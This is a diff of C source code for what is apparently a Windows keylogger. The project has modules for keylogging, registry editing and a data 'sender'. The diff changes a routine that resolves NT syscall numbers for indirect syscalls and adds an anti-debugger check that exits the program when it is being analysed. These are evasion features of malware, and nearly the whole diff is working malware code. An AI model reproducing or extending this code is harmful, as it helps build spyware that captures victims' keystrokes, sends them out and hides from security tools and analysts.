@@ -2,15 +2,13 @@
 #include <stdio.h>
 #include <windows.h>
 
-#include "regedit.h"
-#include "keylogger.h"
-#include "utils.h"
+#include "regedit/regedit.h"
+#include "keylogger/keylogger.h"
+#include "utils/utils.h"
 #include "hash-tables/PressedKeys.h"
 #include "sets/Set.h"
-
 #include "main.h"
-#include "sender.h"
-#include "evasion/evasion.h"
+#include "sender/sender.h"
 
 
 DWORD getProcessPID(const char* processName) {
@@ -30,7 +28,7 @@ DWORD getProcessPID(const char* processName) {
     return 0;
 }
 
-VOID IndirectPrelude(HMODULE NtdllHandle, LPCSTR NtFunctionName, PDWORD NtFunctionSSN, PUINT_PTR NtFunctionSyscall) {
+VOID IndirectPrelude(HMODULE NtdllHandle, char NtFunctionName[], PDWORD NtFunctionSSN, PUINT_PTR NtFunctionSyscall) {
     DWORD SyscallNumber = 0;
     UINT_PTR NtFunctionAddress = 0;
     UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };
@@ -44,6 +42,12 @@ VOID IndirectPrelude(HMODULE NtdllHandle, LPCSTR NtFunctionName, PDWORD NtFuncti
     *NtFunctionSyscall = NtFunctionAddress + 0x12;
 
     if (memcmp(SyscallOpcodes, (PVOID)*NtFunctionSyscall, sizeof(SyscallOpcodes)) != 0) {
+        exit(1);
+    }
+}
+
+void isDebuggerModeOn() {
+    if (_checkDebugger() != 0) {
         exit(1);
     }
 }
